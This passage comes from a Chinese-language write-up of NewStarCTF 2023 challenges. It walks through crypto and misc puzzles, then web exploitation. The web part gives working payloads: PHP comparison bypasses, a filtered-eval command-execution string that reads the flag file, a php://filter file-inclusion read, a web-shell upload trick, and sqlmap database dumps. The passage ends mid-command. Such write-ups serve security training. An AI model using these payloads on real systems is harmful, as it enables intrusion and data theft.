class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.<br>a=<span class="hljs-built_in">input</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brainfuck</span>(<span class="hljs-params">a</span>):<br>    li = [<span class="hljs-number">0</span>]<br>    index = <span class="hljs-number">0</span><br>    kuo = []<br>    output = []<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(a):<br>        <span class="hljs-keyword">if</span> a[i] == <span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">or</span> a[i] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            li[index] = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(li[index]) + a[i] + <span class="hljs-string">&#x27;1&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(li) &lt;= index:<br>                li.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>            index -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;.&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(li[index], end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            output.append(li[index])<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>            i += <span class="hljs-number">1</span><br>            li[index] = <span class="hljs-built_in">ord</span>(a[i])<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;[&#x27;</span>:<br>            <span class="hljs-keyword">if</span> li[index] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">while</span> a[i] != <span class="hljs-string">&#x27;]&#x27;</span>:<br>                    i += <span class="hljs-number">1</span><br>                i += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                kuo.append(i)<br>        <span class="hljs-keyword">elif</span> a[i] == <span class="hljs-string">&#x27;]&#x27;</span>:<br>            <span class="hljs-keyword">if</span> li[index] != <span class="hljs-number">0</span>:<br>                i = kuo.pop()-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                temp = kuo.pop()<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> output<br><br>output = brainfuck(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> output:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>flag&#123;Oiiaioooooiai<span class="hljs-comment">#b7c0b1866fe58e12&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">kqfl&#123;hf3x4w&#x27;x_h1umjw_n5_a4wd_3fed&#125;<br>flag&#123;ca3s4r&#x27;s_c1pher_i5_v4ry_3azy&#125;<br></code></pre></td></tr></table></figure><h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3<br>flag&#123;reordering_the_plaintext#686f8c03&#125;<br></code></pre></td></tr></table></figure><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;<br></code></pre></td></tr></table></figure><p>大厨一个个试过去对应<code>pqc</code>-&gt;<code>fla</code></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">flag&#123;la_c<span class="hljs-number">1</span>fr<span class="hljs-number">4</span>_del_<span class="hljs-number">5</span>ig<span class="hljs-symbol">n0</span>r_giova<span class="hljs-symbol">n_batt1</span>st<span class="hljs-number">4</span>_b<span class="hljs-number">3</span>ll<span class="hljs-number">5</span>s<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=<br>part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=<br>part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`<br><br>part 1 base64 ：flag&#123;dazzling_encoding#4e0ad4<br>part 2 base32：f0ca08d1e1d0f10c0c7afe422fea7<br>part 3 uuencode：c55192c992036ef623372601ff3a&#125;<br></code></pre></td></tr></table></figure><p><code>convert_uudecode</code>函数解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;=8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">convert_undecode</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)<br>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=<br></code></pre></td></tr></table></figure><p>大厨<code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><blockquote><p>小宝最近学会了隐写术，并且在图片中藏了一些秘密，你能发现他的秘密吗？</p></blockquote><p>steg，RGB000</p><p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>导出对象<code>http</code>一个个找</p><p><img src="/2023/10/23/NewStarCTF2023/1697985393564.png" alt="1697985393564"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">W<span class="hljs-name">m14</span>aFozdFhjbWt<span class="hljs-number">6</span>Tld<span class="hljs-symbol">nMGNtdGZNWE5</span>mZFRVelpuV<span class="hljs-symbol">nNYMkkzTW1</span>FMk<span class="hljs-number">1</span>EazF<span class="hljs-symbol">NemRsTm4</span>wSwo=<br>flag&#123;Wri<span class="hljs-number">35</span>h<span class="hljs-number">4</span>rk_<span class="hljs-number">1</span>s_u<span class="hljs-number">53</span>ful_b<span class="hljs-number">72</span>a<span class="hljs-number">609537</span>e<span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>拖进去发现是一个<code>zip</code>，提取出来</p><p><img src="/2023/10/23/NewStarCTF2023/1697985465863.png" alt="1697985465863"></p><p>发现是加密的，经过尝试不是<code>伪加密</code>，发现</p><p><code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</code></p><p>解密说要6位数字密码</p><p>爆破密码<code>232311</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></code></pre></td></tr></table></figure><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p><a href="https://vii5ard.github.io/whitespace/">Whitelips the Esoteric Language IDE</a></p><p><img src="/2023/10/23/NewStarCTF2023/1697985521954.png" alt="1697985521954"></p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>silenteye</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><blockquote><p>粗心的网站管理员总会泄漏一些敏感信息在Web根目录下</p></blockquote><p>使用<code>dirmap</code>扫描，得到<a href="http://www.zip/">www.zip</a></p><p>下载得到index.php和robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt：<br>PART ONE: flag&#123;r0bots_1s_s0_us3ful<br><br>index.php：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$PART_TWO</span> = <span class="hljs-string">&quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！&lt;/h1&gt;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><blockquote><p>普通的上传啦，平平淡淡才是真</p></blockquote><p>抓包，1.jpg改成1.php</p><p>蚁剑连接</p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>页面提示</p><p> give me number1 and number2,i will help you to add  </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-symbol">number2</span>=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>回显 not ssti,flag in source code~3  </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=a&amp;<span class="hljs-symbol">number2</span>=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/image-20231022224604835.png" alt="image-20231022224604835"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>请使用 GET方式 来给 ctf 参数传入任意值来通过这关</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ctf</span>=1<br></code></pre></td></tr></table></figure><p>很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢?如果你传入的参数值并不是我想要的secret，我也不会放你过关的或许你可以找一找我把secret藏在了哪里</p><p>检查源代码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">base<span class="hljs-number">64</span>_decode<span class="hljs-comment">(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)</span><br><span class="hljs-symbol">n3</span>wst<span class="hljs-number">4</span>rCTF<span class="hljs-number">2023</span><span class="hljs-name">g00000</span>d<br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">secret</span><span class="hljs-operator">=</span>n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p>很强，现在我需要验证你的</p><p>power 是否是ctfer 只有ctfer可以通过这关</p><p>Cookie: power&#x3D;ctfer</p><p>使用 NewStarCTF2023浏览器 来通过这关!</p><p>User-Agent: NewStarCTF2023</p><p>Referer: newstarctf.com</p><p>本地用户</p><p>X-Real-IP:127.0.0.1</p><p><code>flag&#123;73830fa0-1fe2-4beb-9d6b-9e5025480203&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>PHP是世界上最安全的语言，真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$flag1</span> = True;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$flag2</span> = True;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-variable">$flag3</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>      <span class="hljs-variable">$flag4</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>  &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>数组绕过强比较POST：payload：<code>key3[]=1</code></p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>中<code>file_get_contents(&quot;/flag&quot;)</code>的值是字符串</p><p>这里strcmp有一个bug就是如果比较的是数组的话，直接返回一个0。</p><p>payload：<code>key4[]=1</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!<span class="hljs-built_in">is_numeric</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span> &gt; <span class="hljs-number">2023</span><br></code></pre></td></tr></table></figure><p><code>is_numeric</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><p>payload：<code>key5=2024%00</code></p><p>要求键值即<code>=</code>后面的值不是<code>字母、数字</code></p><p>完整payload：</p><p>GET：<code>?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024%00</code></p><p>POST：<code>key3[]=*&amp;flag5=*</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>  <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/image-20231022225113765.png" alt="image-20231022225113765"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">password</span>=evcxdcczxrbdw&amp;e[v.a.<span class="hljs-attribute">l</span>=echo `tac /fl??`;<br></code></pre></td></tr></table></figure><p>tac换成sort也行</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>注册登录进去是一个<code>chat对话框</code>没用</p><p><code>ctrl+d</code>退出对话框，翻遍<code>Linux</code>啥都没</p><p>按方向上键查询历史记录，得到密码是弱密码</p><p>试出来密码是<code>000000</code></p><p>再登陆终端，提示试用burp</p><p><code>admin</code>登录抓包</p><p>发现<code>/passport</code>的302跳转</p><p><img src="/2023/10/23/NewStarCTF2023/1697986347417.png" alt="1697986347417"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>打开发现要玩游戏超过十万分</p><p>搜索<code>alter</code>，发现没有flag</p><p>查看<code>app.js</code>，把分数改成<code>10</code></p><p><img src="/2023/10/23/NewStarCTF2023/1697986810431.png" alt="1697986810431"></p><p>抓包</p><p><img src="/2023/10/23/NewStarCTF2023/1697986829775.png" alt="1697986829775"></p><p><code>score</code>修改大于100000，得到flag</p><p><img src="/2023/10/23/NewStarCTF2023/1697986849830.png" alt="1697986849830"></p><h3 id="include-O。O"><a href="#include-O。O" class="headerlink" title="include O。O"></a>include O。O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>  @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>猜测题目对flag进行了<code>base/rot</code>过滤</p><p>payload：<code>?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">80</span>aa7b2f-<span class="hljs-number">6</span>f0e-<span class="hljs-number">46</span>bb-<span class="hljs-number">8233</span>-<span class="hljs-number">3046</span>e5a8a11a&#125;<br></code></pre></td></tr></table></figure><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>sqlmap一把梭</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url?id=TMP0919&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span>  -D ctf <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span> -D ctf -T here_is_flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span>  -D ctf -T here_is_flag -C flag <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br>flag&#123;a08ce636-<span class="hljs-number">0</span>f3d-<span 